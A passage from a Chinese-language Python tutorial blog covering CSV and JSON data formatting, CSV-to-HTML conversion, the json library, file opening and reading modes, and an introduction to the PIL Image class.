&lt;输出文件&gt;.write(&quot;,&quot;.join(row)+&quot;\n&quot;)</code></pre><ul><li>二维数据写入CSV文件。整个程序分为3部分：<strong>首先将原始文件中的数据全部导入，用列表方式表示</strong>；第二，<strong>对列表的元素逐行判断，对浮点数值进行百分比运算，运算结果写回列表</strong>；第三，<strong>将更新后的列表输出新的CSV文件</strong></li></ul><pre><code class="python">fr = open(&quot;price2021.csv&quot;, &quot;r&quot;)fw = open(&quot;price2021out.csv&quot;, &quot;w&quot;)ls = []for line in fr:      #将CSV文件中的二维数据读入到列表变量    line = line.replace(&quot;\n&quot;,&quot;&quot;)    ls.append(line.split(&quot;,&quot;))for i in range(len(ls)):    #遍历列表变量计算百分数    for j in range(len(ls[i])):        if ls[i][j].replace(&quot;.&quot;,&quot;&quot;).isnumeric():             ls[i][j] = &quot;&#123;:.2&#125;%&quot;.format(float(ls[i][j])/100)for row in ls:      #将列表变量中的两位数据输出到CSV文件    print(row)    fw.write(&quot;,&quot;.join(row)+&quot;\n&quot;)fr.close()fw.close()#运行结果[&#39;城市&#39;, &#39;环比&#39;, &#39;同比&#39;, &#39;定基&#39;]             [&#39;北京&#39;, &#39;1.0%&#39;, &#39;1.2%&#39;, &#39;1.2%&#39;]           [&#39;上海&#39;, &#39;1.0%&#39;, &#39;1.3%&#39;, &#39;1.3%&#39;]            [&#39;广州&#39;, &#39;1.0%&#39;, &#39;1.2%&#39;, &#39;1.2%&#39;]              [&#39;深圳&#39;, &#39;1.0%&#39;, &#39;1.4%&#39;, &#39;1.5%&#39;]         [&#39;沈阳&#39;, &#39;1.0%&#39;, &#39;1.0%&#39;, &#39;1.0%&#39;]</code></pre><p>（6）上述的第9行代码用于判断一个字符串是否类似”101.5”由数字和小数点组成。由于Python没有单个函数能够直接判断，因此，通过replace()方法将其中可能的小数点去掉，再通过isnumeric()方法判断其余字符是否都是数字。这是一种不完备的判断方式，但在该例中可以使用。</p><h2 id="CSV格式的HTML展示"><a href="#CSV格式的HTML展示" class="headerlink" title="CSV格式的HTML展示"></a>CSV格式的HTML展示</h2><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;CSV2HTML&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2 align=&quot;center&quot;&gt;2016年7月部分大中城市新建住宅价格指数&lt;/h2&gt;    &lt;table border=&quot;1&quot; align=&quot;center&quot; width=&quot;70%&quot;&gt;        &lt;tr bgcolor=&quot;orange&quot;&gt;            &lt;th width=&quot;25%&quot;&gt;城市&lt;/th&gt;            &lt;th width=&quot;25%&quot;&gt;环比&lt;/th&gt;            &lt;th width=&quot;25%&quot;&gt;同比&lt;/th&gt;            &lt;th width=&quot;25%&quot;&gt;定基&lt;/th&gt;        &lt;/tr&gt;        &lt;tr align=&quot;center&quot;&gt;            &lt;td&gt;北京&lt;/td&gt;            &lt;td&gt;101.5&lt;/td&gt;            &lt;td&gt;120.7&lt;/td&gt;            &lt;td&gt;121.4&lt;/td&gt;        &lt;/tr&gt;        &lt;tr align=&quot;center&quot;&gt;            &lt;td&gt;上海&lt;/td&gt;            &lt;td&gt;101.2&lt;/td&gt;            &lt;td&gt;127.3&lt;/td&gt;            &lt;td&gt;127.8&lt;/td&gt;        &lt;/tr&gt;        &lt;tr align=&quot;center&quot;&gt;            &lt;td&gt;广州&lt;/td&gt;            &lt;td&gt;101.3&lt;/td&gt;            &lt;td&gt;119.4&lt;/td&gt;            &lt;td&gt;120.0&lt;/td&gt;        &lt;/tr&gt;        &lt;tr align=&quot;center&quot;&gt;            &lt;td&gt;深圳&lt;/td&gt;            &lt;td&gt;102.0&lt;/td&gt;            &lt;td&gt;140.9&lt;/td&gt;            &lt;td&gt;145.5&lt;/td&gt;        &lt;/tr&gt;        &lt;tr align=&quot;center&quot;&gt;            &lt;td&gt;沈阳&lt;/td&gt;            &lt;td&gt;100.1&lt;/td&gt;            &lt;td&gt;101.4&lt;/td&gt;            &lt;td&gt;101.6&lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/04/01/St9sTude8MIV3bf.png" alt="image-20210401203558060"></p><p>（1）将CSV文件转换成HTML文件分为3个步骤：</p><ul><li>首先，读入CSV文件，获得文件数据</li><li>其次，对数据进行格式处理和转换</li><li>最后，输出与上述代码相同的HTML格式文件</li></ul><pre><code class="python">seg1 = &#39;&#39;&#39;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;meta charset=utf-8&gt;&lt;h2 align=&quot;center&quot;&gt;2016年7月部分大中城市新建住宅价格指数&lt;/h2&gt;&lt;table border=&quot;1&quot; align=&quot;center&quot; width=&quot;70%&quot;&gt;&lt;tr bgcolor=&quot;orange&quot;&gt;\n &#39;&#39;&#39;seg2 = &quot;&lt;/tr&gt;\n&quot;seg3 = &quot;&lt;/table&gt;\n&lt;/body&gt;\n&lt;/html&gt;&quot;def fill_data(locls):    seg = &#39;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&#123;&#125;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;\          &#123;&#125;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&#123;&#125;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;\          &#123;&#125;&lt;/td&gt;&lt;/tr&gt;\n&#39;.format(*locls)    return segfr = open(&quot;price2021.csv&quot;,&quot;r&quot;)ls = []for line in fr:    line = line.replace(&quot;\n&quot;,&quot;&quot;)    ls.append(line.split(&quot;,&quot;))fr.close()fw = open(&quot;price2021.html&quot;,&quot;w&quot;)fw.write(seg1)fw.write(&#39;&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n\&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n\&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n\&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n&#39;.format(*ls[0]))fw.write(seg2)for i in range(len(ls)-1):    fw.write(fill_data(ls[i+1]))fw.write(seg3)fw.close()</code></pre><p>（2）上述代码将CSV文件中的数据读入到列表ls，然后通过格式化字符串方法将ls中的内容写入HTML文件。</p><h2 id="高维数据的格式化"><a href="#高维数据的格式化" class="headerlink" title="高维数据的格式化"></a>高维数据的格式化</h2><p>（1）高维数据能展示数据间更为复杂的组织关系，表示高维关系不采用任何结构形式，仅采用最基本的二元关系，即<strong>键值对</strong>。</p><p>（2）万维网（WWW）是一个复杂的数据组织体系，它通过HTML方式链接并展示不同类型数据内容，采用<strong>XML或JSON格式表达键值对，形成数据间复杂的结构关系</strong>。万维网是高维数据最成功的典型应用。</p><p>（3）JSON格式可以<strong>对高维数据进行表达和存储。</strong>JSON是一种轻量级的数据交换格式，易于阅读和理解。JSON格式表达键值对&lt;key, value&gt;的基本格式如下：</p><pre><code>&quot;key&quot; : &quot;value&quot;   #键值对都保存在双引号中</code></pre><p>（4）当多个键值对放在一起时，JSON有如下一些约定</p><ul><li>数据保存在键值对中</li><li>键值对之间由逗号分隔</li><li>大括号用于保存键值对数据组成的对象</li><li>方括号用于保存键值对数据组成的数组</li></ul><p>例如：</p><pre><code>&quot;本书作者&quot; : [                &#123; &quot;姓氏&quot; : &quot;嵩&quot;,                  &quot;名字&quot; : &quot;天&quot;,                  &quot;单位&quot; : &quot;北京理工大学  &#125;,                &#123; &quot;姓氏&quot; : &quot;礼&quot;                  &quot;名字&quot; : &quot;欣&quot;                  &quot;单位&quot; : &quot;北京理工大学&quot; &#125;,                &#123; &quot;姓氏&quot; : &quot;黄&quot;                  &quot;名字&quot; : &quot;天羽&quot;                  &quot;单位&quot; : &quot;北京理工大学&quot; &#125;            ]</code></pre><p>（5）首先它是一个键值对，由“本书作者”与内容组成；由于存在3个作者，作者之间采用逗号分隔，作者之间是对等关系，形成一个数组，采用方括号分隔；每个作者是一个对象，采用大括号组织，因为对象中包括作者的姓氏、名字和单位，每一项都是一个键值对，对应作者的一个属性。</p><p>（6）采用对象、数组方式组织起来的键值对可以表示任何结构的数据。目前，万维网上使用的高维数据格式主要是JSON和XML，建议采用JSON格式。<strong>格式化高维数据采用Python语言的标准库json。</strong></p><p>扩展：XML</p><ul><li>XML，可扩展标记语言。XML格式需要成对的标签表示键值对。“本书作者”的XML描述如下。</li></ul><pre><code>&lt;本书作者&gt;    &lt;姓氏&gt;嵩&lt;/姓氏&gt;&lt;名字&gt;天&lt;/名字&gt;&lt;单位&gt;北京理工大学&lt;/单位&gt;    &lt;姓氏&gt;礼&lt;/姓氏&gt;&lt;名字&gt;欣&lt;/名字&gt;&lt;单位&gt;北京理工大学&lt;/单位&gt;    &lt;姓氏&gt;黄&lt;/姓氏&gt;&lt;名字&gt;天羽&lt;/名字&gt;&lt;单位&gt;北京理工大学&lt;/单位&gt;&lt;/本书作者&gt;</code></pre><ul><li>XML对key值要存储两次（&lt;key&gt;&lt;/key&gt;），而JSON只需要存储一次，且在数据交换时产生更少的网络带宽和存储需求，因此，JSON更为常用。</li></ul><h2 id="json库的使用"><a href="#json库的使用" class="headerlink" title="json库的使用"></a>json库的使用</h2><h3 id="json库概述"><a href="#json库概述" class="headerlink" title="json库概述"></a>json库概述</h3><p>（1）json库是处理JSON格式的Python标准库，一般用于JSON格式和其他类型格式转换，导入方式如下：</p><pre><code class="python">import json</code></pre><p>（2）json库主要包括两类函数：操作类函数和解析类函数。</p><ul><li>操作类函数主要完成外部JSON格式和程序内部数据类型之间的转换功能。</li><li>解析类函数主要用于解析键值对内容。</li></ul><p>（3）json格式包括<strong>对象和数组</strong>，用大括号{}和方括号[]表示，分别对应键值对的组合关系和对等关系。一般来说，JSON格式的<strong>对象将被json库解析为字典，JSON格式的数组将被解析为列表。</strong></p><h3 id="json库解析"><a href="#json库解析" class="headerlink" title="json库解析"></a>json库解析</h3><p>（1）json库包含两个过程：编码（encoding）和解码（decoding）。</p><ul><li>编码是将Python数据类型变换成JSON格式的过程</li><li>解码是从JSON格式中解析数据对应到Python数据类型的过程</li><li>本质上，编码和解码是<strong>数据类型序列化和反序列化的过程</strong></li></ul><p>扩展：<strong>序列化和反序列化</strong></p><ul><li>序列化是指将对象数据类型转换为可以存储或网络传输格式的过程，传输格式一般为JSON或XML</li><li>反序列化指从存储区域中将JSON或XML格式读出并重建对象的过程。</li><li>JSON序列化和反序列化的过程分别是编码和解码</li></ul><p>（2）下表列出了json库的4个操作类函数，其中dumps()和loads()分别对应编码和解码功能</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">json.dumps(obj,sort_keys=False,indent=None)</td><td align="center">将Python的数据类型转换为JSON格式，编码过程</td></tr><tr><td align="center">json.loads(string)</td><td align="center">将JSON格式字符串转换为Python的数据类型，解码过程</td></tr><tr><td align="center">json.dump(obj,fp,sort_keys=False,indent=None)</td><td align="center">与dumps()功能一致，输出到文件fp</td></tr><tr><td align="center">json.load(fp)</td><td align="center">与loads()功能一致，从文件fp读入</td></tr></tbody></table><p>（3）json.dumps()中的</p><ul><li><strong>obj可以是Python的列表或字典类型</strong>，当输入字典类型时，dumps()函数将其变为JSON格式字符串。</li><li><strong>默认生成的字符串是顺序存放的</strong>，sort_keys可以对字典元素按照key进行排序，控制输出结果。</li><li><strong>indent参数用于增加数据缩进</strong>，使得生成的JSON格式字符串更具有可读性。</li></ul><pre><code class="python">&gt;&gt;&gt; import json&gt;&gt;&gt; dt = &#123;&#39;b&#39;:2,&#39;c&#39;:4,&#39;a&#39;:6&#125;&gt;&gt;&gt; s1 = json.dumps(dt)          #dumps返回JSON格式的字符串类型&gt;&gt;&gt; s2 = json.dumps(dt,sort_keys=True,indent=4)&gt;&gt;&gt; print(s1)&#123;&quot;b&quot;: 2, &quot;c&quot;: 4, &quot;a&quot;: 6&#125;&gt;&gt;&gt; print(s2)&#123;    &quot;a&quot;: 6,    &quot;b&quot;: 2,    &quot;c&quot;: 4&#125;&gt;&gt;&gt; print(s1==s2)False&gt;&gt;&gt; dt2 = json.loads(s2)&gt;&gt;&gt; print(dt2,type(dt2))&#123;&#39;a&#39;: 6, &#39;b&#39;: 2, &#39;c&#39;: 4&#125; &lt;class &#39;dict&#39;&gt;</code></pre><h2 id="CSV和JSON格式相互转换"><a href="#CSV和JSON格式相互转换" class="headerlink" title="CSV和JSON格式相互转换"></a>CSV和JSON格式相互转换</h2><p>（1）CSV格式常用于一二维数据表示和存储，它是一种纯文本形式存储表格数据的表示方法。JSON也可以表示一二维数据。在网络信息传输中，可能需要统一表示，因此，需要在二者之间相互转换。</p><h3 id="CSV转JSON"><a href="#CSV转JSON" class="headerlink" title="CSV转JSON"></a>CSV转JSON</h3><p>（2）以price2021.csv作为输入，希望输出的JSON格式对应于每行数据如下：</p><pre><code>&quot;同比&quot;: &quot;120.7&quot;,&quot;城市&quot;: &quot;北京&quot;,&quot;定基&quot;: &quot;121.4&quot;,&quot;环比&quot;: &quot;101.5&quot;</code></pre><p>将CSV格式转换成JSON格式的代码如下：</p><pre><code class="python">import jsonfr = open(&quot;price2021.csv&quot;, &quot;r&quot;)ls = []for line in fr:    line = line.replace(&quot;\n&quot;,&quot;&quot;)    ls.append(line.split(&#39;,&#39;))fr.close()fw = open(&quot;price2021.json&quot;, &quot;w&quot;)for i in range(1,len(ls)):    ls[i] = dict(zip(ls[0], ls[i]))      #dict()用于创建一个字典，zip()是一个内置函数，能够将两个长度相同的列表组合成一个关系对json.dump(ls[1:],fw, sort_keys=True, indent=4)fw.close()#执行结果部分内容[    &#123;        &quot;\u540c\u6bd4&quot;: &quot;120.7&quot;,        &quot;\u57ce\u5e02&quot;: &quot;\u5317\u4eac&quot;,        &quot;\u5b9a\u57fa&quot;: &quot;121.4&quot;,        &quot;\u73af\u6bd4&quot;: &quot;101.5&quot;    &#125;,    ...</code></pre><p>（3）zip()函数适合用于生成键值对。</p><pre><code class="python">&gt;&gt;&gt; x = [1,2,3]&gt;&gt;&gt; y = [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]&gt;&gt;&gt; list(zip(x,y)) [(1, &#39;a&#39;), (2, &#39;b&#39;), (3, &#39;c&#39;)]</code></pre><p>（4）上例转换代码没有输出中文字符，原内容的中文字符被替换成了Unicode编码。<strong>json库默认采用Unicode编码处理非西文字符，主要为了避免网络传输中因编码方式不同带来的问题。</strong></p><p>（5）可以通过在dump()函数中修改ensure_ascii参数默认值使json库输出中文字符。修改实例中第12行代码：</p><pre><code class="python">json.dump(ls[1:],fw, sort_keys=True, indent=4, ensure_ascii=False)</code></pre><ul><li>修改后的代码执行结果：</li></ul><pre><code>[    &#123;        &quot;同比&quot;: &quot;120.7&quot;,        &quot;城市&quot;: &quot;北京&quot;,        &quot;定基&quot;: &quot;121.4&quot;,        &quot;环比&quot;: &quot;101.5&quot;    &#125;,    &#123;        &quot;同比&quot;: &quot;127.3&quot;,        &quot;城市&quot;: &quot;上海&quot;,        &quot;定基&quot;: &quot;127.8&quot;,        &quot;环比&quot;: &quot;101.2&quot;    &#125;,    &#123;        &quot;同比&quot;: &quot;119.4&quot;,        &quot;城市&quot;: &quot;广州&quot;,        &quot;定基&quot;: &quot;120&quot;,        &quot;环比&quot;: &quot;101.3&quot;    &#125;,    &#123;        &quot;同比&quot;: &quot;140.9&quot;,        &quot;城市&quot;: &quot;深圳&quot;,        &quot;定基&quot;: &quot;145.5&quot;,        &quot;环比&quot;: &quot;102&quot;    &#125;,    &#123;        &quot;同比&quot;: &quot;101.4&quot;,        &quot;城市&quot;: &quot;沈阳&quot;,        &quot;定基&quot;: &quot;101.6&quot;,        &quot;环比&quot;: &quot;100.1&quot;    &#125;]</code></pre><h3 id="JSON转CSV"><a href="#JSON转CSV" class="headerlink" title="JSON转CSV"></a>JSON转CSV</h3><pre><code class="python">import jsonfr = open(&quot;price2021.json&quot;,&quot;r&quot;)ls = json.load(fr)data = [ list(ls[0].keys())]    #keys()方法返回所有的键for item in ls:    data.append(list(item.values()))   #使用 list() 来转换为列表，列表为字典中的所有值。fr.close()fw = open(&quot;price2021_form_json.csv&quot;, &quot;w&quot;)for item in data:    fw.write(&quot;,&quot;.join(item) + &quot;\n&quot;)#join() 方法用于将序列中的元素以指定的字符连接生成一个新的字符串。fw.close()</code></pre><p>扩展：Python的数据类型转换函数</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">int(x,[,base])</td><td align="center">将字符串x转换为一个整数</td></tr><tr><td align="center">float(x)</td><td align="center">将字符串x转换为一个浮点数</td></tr><tr><td align="center">complex(real,[,image])</td><td align="center">根据real和image创建一个浮点数</td></tr><tr><td align="center">str(x)</td><td align="center">将对象x转换为字符串</td></tr><tr><td align="center">repr(obj)</td><td align="center">将对象obj当作Python语句执行，返回结果的字符串形式</td></tr><tr><td align="center">eval(str)</td><td align="center">计算字符串中的有效Python表达式，返回结果</td></tr><tr><td align="center">tuple(s)</td><td align="center">将序列s转换为一个元组</td></tr><tr><td align="center">list(s)</td><td align="center">将序列s转换为一个列表</td></tr><tr><td align="center">chr(x)</td><td align="center">将一个整数转换为一个字符</td></tr><tr><td align="center">unichr(x)</td><td align="center">将一个整数转换为Unicode字符</td></tr><tr><td align="center">ord(x)</td><td align="center">将一个字符转换为它的整数值</td></tr><tr><td align="center">hex(x)</td><td align="center">将一个整数转换为一个十六进制字符串</td></tr><tr><td align="center">oct(x)</td><td align="center">将一个整数转换为一个八进制字符串</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言九-文件和数据格式化01</title>
      <link href="2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/"/>
      <url>2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/</url>
      
        <content type="html"><![CDATA[<h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><h3 id="文件概述"><a href="#文件概述" class="headerlink" title="文件概述"></a>文件概述</h3><p><strong>Python能够以文本和二进制两种方式处理文件</strong></p><p>（1）文件是一个存储在辅助存储器上的数据序列，可以包含任何数据内容。文件包括两种类型：<strong>文本文件和二进制文件。</strong></p><p>（2）文本文件一般由单一特定编码的字符组成，如UTF-8编码，内容容易统一展示和阅读。由于文本文件存在编码，因此，它也可以被看作是存储在磁盘上的长字符串，例如一个txt格式的文本文件。</p><p>（3）二进制文件直接由比特0和比特1组成，没有统一字符编码，文件内部数据的组织格式与文件用途有关。<strong>二进制文件与文本文件最主要的区别在于是否有统一的字符编码。</strong>二进制文件没有统一的字符编码，只能当作字节流，而不能看做是字符串。</p><p>（4）无论文件是创建为文本文件还是二进制文件，都可以用“文本文件方式”和“二进制文件方式”打开，但打开后的操作不同。</p><pre><code class="python">textFile = open(&quot;1.txt&quot;,&quot;rt&quot;)   #t表示文本文件方式print(textFile.readline())    #readline()是读出一行内容，read()是读出整个文件的内容textFile.close()              #关闭该文件binFile = open(&quot;1.txt&quot;,&quot;rb&quot;)   #b表示二进制文件方式print(binFile.readline())binFile.close()#运行结果中国是个伟大的国家！b&#39;\xe4\xb8\xad\xe5\x9b\xbd\xe6\x98\xaf\xe4\xb8\xaa\xe4\xbc\x9f\xe5\xa4\xa7\xe7\x9a\x84\xe5\x9b\xbd\xe5\xae\xb6\xef\xbc\x81\n&#39;</code></pre><p>（5）采用文本方式读入文件，<strong>文件经过编码形成字符串，打印出有含义的字符；采用二进制方式打开文件，文件被解析为字节(Byte)流。</strong>由于存在编码，<strong>字符串中的一个字符由两个字节表示。</strong></p><h3 id="文件的打开关闭"><a href="#文件的打开关闭" class="headerlink" title="文件的打开关闭"></a>文件的打开关闭</h3><p>（1）Python对文本文件和二进制文件采用统一的操作步骤，即“打开——操作——关闭”。</p><p>（2）操作系统中的文件默认处于存储状态，首先需要将其打开，使得当前程序有权操作这个文件，打开不存在的文件可以创建文件。<strong>打开后的文件处于占用状态，此时，另一个进程不能操作这个文件。</strong></p><p>（3）可以通过一组方法读取文件的内容或向文件写入内容，此时，文件作为一个数据对象存在，采用<a>.<b>()方式进行操作。</p><p>（4）操作之后需要将文件关闭，关闭将释放对文件的控制使文件恢复存储状态，此时，另一个进程将能够操作这个文件。</p><p><img src="https://i.loli.net/2021/03/30/3RkTJ7EbMZf8BuP.png" alt="image-20210330112125720"></p><p>（5）Python通过解释器内置的open()函数打开一个文件，并实现该文件与一个程序变量的关联，open()函数格式如下：</p><pre><code>&lt;变量名&gt; = open(&lt;文件名&gt;, &lt;打开模式&gt;)</code></pre><p>（6）open()函数有两个参数：文件名和打开模式。文件名可以使文件的实际名字，<strong>也可以是包含完整路径的名字</strong>。<strong>打开模式用于控制使用何种方式打开文件</strong>,open()函数提供了7种基本的打开模式。</p><table><thead><tr><th>文件的打开模式</th><th>含义</th></tr></thead><tbody><tr><td>‘r’</td><td>只读模式，若文件不存在，返回异常FileNotFoundError，默认值</td></tr><tr><td>‘w’</td><td>覆盖写模式，文件不存在则创建，存在则完全覆盖</td></tr><tr><td>‘x’</td><td>创建写模式，文件不存在则创建，存在则返回异常FileExistsError</td></tr><tr><td>‘a’</td><td>追加写模式，文件不存在则创建，存在则在文件最后追加内容</td></tr><tr><td>‘b’</td><td>二进制文件模式</td></tr><tr><td>‘t’</td><td>文本文件模式，默认值</td></tr><tr><td>‘+’</td><td>与/r/w/x/a一同使用，在原功能基础上增加同时读写功能</td></tr></tbody></table><p>（7）打开模式使用字符串方式表示，根据字符串定义，单引号或者双引号均可。上述打开模式中，’r’、’w’、’x’、’a’可以和’b’、’t’、’+’组合使用，形成既表达读写又表达文件模式的方式。例如，open()函数默认采用’rt’（文本只读）模式，读入程序所在目录中1.txt文件：</p><pre><code>textFile = open(&#39;1.txt&#39;, &#39;r&#39;)或者textFiel = open(&#39;1.txt&#39;)</code></pre><p>（8）读取一个二进制文件，如一张图片、一段视频或者一段音乐，需要使用文件打开模式’rb’。例如，打开一个名为”music.mp3“的音频文件：</p><pre><code>binFile = open(&#39;music.mp3&#39;, &#39;rb&#39;)</code></pre><p>（9）文件结束后要用close()方法关闭，释放文件的使用授权，该方法的使用方式如下：</p><pre><code>&lt;变量名&gt;.close()</code></pre><h3 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h3><p>（1）当文件被打开后，根据打开的方式不同可以对文件进行相应的读写操作。</p><ul><li>当文件以文本文件方式打开后，读写按照字符串方式，采用当前计算机使用的编码或指定编码。</li><li>当文件以二进制文件方式打开时，读写按照字节流方式。</li></ul><p>（2）Python提供3个常用的文件内容读取方法，如下表所示：</p><table><thead><tr><th>操作方法</th><th>含义</th></tr></thead><tbody><tr><td>&lt;file&gt;.read(size = -1)</td><td>从文件中读入整个文件内容，若给出参数，读入前size长度的字符串或字节流</td></tr><tr><td>&lt;file&gt;.readline(size = -1)</td><td>从文件中读入一行内容，如果给出参数，读入该行前size长度的字符串或字节流</td></tr><tr><td>&lt;file&gt;.readlines(hint = -1)</td><td>从文件中读入所有行，以每行为元素形成一个列表，若给出参数，读入hint行</td></tr></tbody></table><p>（3）文本文件逐行打印：用户输入文件路径，以文本文件方式读入文件内容并逐行打印。</p><pre><code class="python">fname = input(&quot;请输入要打开的文件：&quot;)fo = open(fname, &quot;r&quot;)for line in fo.readlines():    print(line)fo.close()&#39;&#39;&#39;程序首先提示用户输入一个文件名，然后打开文件并复制给文件对象变量fo。文件的全部内容通过fo.readlines()方法读入到一个列表中，列表中的每个元素是文件一行的内容，然后通过for-in方式遍历列表，处理每行内容。&#39;&#39;&#39;</code></pre><p>（4）上述实例存在一个缺点：当读入文件非常大时，一次性将内容读取到列表中会占用很多内存，影响程序执行速度。</p><p>解决方法：<strong>逐行读入内容到内存，并逐行处理。</strong>Python将文件本身作为一个行序列，遍历文件的所有行可以直接这样完成：</p><pre><code class="python">fname = input(&quot;请输入要打开的文件：&quot;)fo = open(fname, &quot;r&quot;)for line in fo:    print(line)fo.close()&#39;&#39;&#39;若程序需要逐行处理文件内容，建议采用上述代码中的2到5行组成的格式。fo = open(fname, &quot;r&quot;)for line in fo:    #处理一行数据fo.close()&#39;&#39;&#39;</code></pre><p>扩展：<strong>文件的换行符</strong>：若采用二进制方式打开文件，换行符只是一个符号，对应一个字节，表示为“\n”。若采用文本方式打开文件，换行符表示一行的结束。</p><p>（5）Python提供3个与文件内容写入有关的方法，如下表所示。</p><table><thead><tr><th>方法</th><th>含义</th></tr></thead><tbody><tr><td>&lt;file&gt;.write(s)</td><td>向文件中写入一个字符串或字节流</td></tr><tr><td>&lt;fiel&gt;.writelines(lines)</td><td>将一个元素全为字符串的列表写入文件</td></tr><tr><td>&lt;file&gt;.seek(offset)</td><td>改变当前文件操作指针的位置，offset的值：0——文件开头；1——当前位置；2——文件结尾</td></tr></tbody></table><p>（6）向文件写入一个列表，并打印输出结果，代码如下：</p><pre><code class="python">fname = input(&quot;请输入要写入的文件：&quot;)fo = open(fname,&#39;w+&#39;)ls = [&quot;唐诗&quot;,&quot;宋词&quot;,&quot;元曲&quot;]fo.writelines(ls)for line in fo:    print(line)fo.close()#执行结果：&gt;&gt;&gt;请输入要写入的文件：test.txt&gt;&gt;&gt;#linxu下查看文件cat test.txt唐诗宋词元曲</code></pre><p>（7）上例中ls内容被写入了文件，但第5行至第7行的代码没有将内容打印出来。<strong>这是因为文件写入内容后，当前文件操作指针在写入内容的后面，第5行至第7行的代码从指针开始向后读入并打印内容，被写入的内容却在指针前面，因此未能被打印出来。</strong>为此，可以在写入文件后增加一条代码fo.seek(0)将文件操作指针返回到文件开始，即可显示写入的内容。</p><pre><code class="python">fname = input(&quot;请输入要写入的文件：&quot;)fo = open(fname,&quot;w+&quot;)ls = [&quot;唐诗&quot;,&quot;宋词&quot;,&quot;元曲&quot;]fo.writelines(ls)              #writelinses()方法并不在列表后面增加换行，只是将列表内容直接排列输出。fo.seek(0)for line in fo:    print(line)fo.close()#程序执行结果：&gt;&gt;&gt;请输入要写入的文件：test1.txt唐诗宋词元曲</code></pre><h2 id="PIL库的使用"><a href="#PIL库的使用" class="headerlink" title="PIL库的使用"></a>PIL库的使用</h2><h3 id="PIL库概述"><a href="#PIL库概述" class="headerlink" title="PIL库概述"></a>PIL库概述</h3><p>（1）PIL（Python Image Library）库是Python语言的第三方库，需要通过pip工具安装。注：安装库的名字是pillow。</p><pre><code class="python">pip3 install pillow</code></pre><p>（2）PIL库支持图像存储、显示和处理，它能够处理几乎所有图片格式，可以完成对图像的缩放、剪裁、叠加以及向图像添加线条、图像和文字等操作。</p><p>（3）PIL库主要可以实现<strong>图像归档和图像处理</strong>两方面功能需求</p><ul><li>图像归档：对图像进行批处理、生成图像预览、图像格式转换等。</li><li>图像处理：图像基本处理、像素处理、颜色处理等。</li></ul><p>（4）PIL库最常用的3个子库：Image、ImageFilter、ImageEnhance。PIL库共包括21个与图片相关的类，参考网站<a href="http://effbot.org/imagingbook/">http://effbot.org/imagingbook/</a></p><h3 id="PIL库Image类解析"><a href="#PIL库Image类解析" class="headerlink" title="PIL库Image类解析"></a>PIL库Image类解析</h3><p>（1）Image是PIL最重要的类，它代表一张图片。</p><pre><code class="python">from PIL import Image       #引入Image类</code></pre><p>（2）在PIL中，任何一个图像文件都可以用Image对象来表示。下表给出了Image类的图像读取和创建方法。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>Image.open(filename)</td><td>根据参数加载图像文件</td></tr><tr><td>Image.new(mode,size,color)</td><td>根据给定参数创建一个新的图像</td></tr><tr><td>Image.open(StringIO.StringIO(buffer))</td><td>从字符串中获取图像</td></tr><tr><td>Image.frombytes(mode,size,data)</td><td>根据像素点data创建图像</td></tr><tr><td>Image.verify()</td><td>对图像文件完整性进行检查，返回异常</td></tr></tbody></table><p>（3）通过Image打开图像文件时，图像的栅格<strong>数据不会被直接解码或者加载</strong>，程序只是读取了图像文件头部的元数据信息，这部分信息标识了图像的<strong>格式、颜色、大小</strong>等。所以打开一个文件会很快，与图像的存储和压缩方式无关。</p><p>（4）要加载一个图像文件，最简单的形式如下，之后所有的操作对im起作用。</p><pre><code class="python">&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; im = Image.open(&quot;/media/fafusr/28AC2EBFAC2E8780/图片/我的图片/3.jpg&quot;) #绝对路径&gt;&gt;&gt; im = Image.open(&quot;3.jpg&quot;)</code></pre><p>（5）在使用IDLE交互方式处理图片文件时，建议采用文件的绝对路径；如果使用Python文件形式，建议采用相对路径，将文件和程序放到一个目录中。</p><p>（6）Image类有4个处理图片的常用属性。</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>Image.format</td><td>标识图像格式或来源，若图像不是从文件读取，值为None</td></tr><tr><td>Image.mode</td><td>图像的色彩模式，”L”为灰度图像、”RGB”为真色彩图像、”CMYK”为出版图像</td></tr><tr><td>Image.size</td><td>图像宽度和高度，单位是像素(px)，返回值是二元元组(tuple)</td></tr><tr><td>Image.palette</td><td>调色板属性，返回一个ImagePalette类型</td></tr></tbody></table><p>查看已经读取的图像文件的属性如下：</p><pre><code class="python">&gt;&gt;&gt; print(im.format,im.size,im.mode)JPEG (1080, 1080) 